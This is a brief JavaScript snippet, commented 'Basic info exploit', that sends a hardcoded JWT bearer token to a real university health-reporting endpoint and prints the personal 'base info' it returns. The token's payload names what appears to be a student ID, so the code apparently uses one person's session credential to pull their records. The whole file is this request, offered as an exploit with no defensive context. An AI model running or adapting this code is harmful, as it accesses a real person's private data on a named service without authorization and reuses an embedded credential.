// Basic info exploit

function fuck() {
    const headers = new Headers();
    headers.append("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ6ZW1jaG8iLCJhdWQiOiIiLCJleHAiOjE2MDMxMjQ0NDIsImRhdGEiOnsidXNlcm5hbWUiOiIyMDE3NDE0MDIxMzkifX0.Szjs1GrRWcNyYef8KHXwX4woCEke2m5l4ztQeaB4Mxo");
    fetch("https://yqfk.dgut.edu.cn/home/base_info/getBaseInfo", {
        headers: headers,
    }).then(res => {
        return res.text();
    }).then(txt => {
        console.log(txt);
    });
}
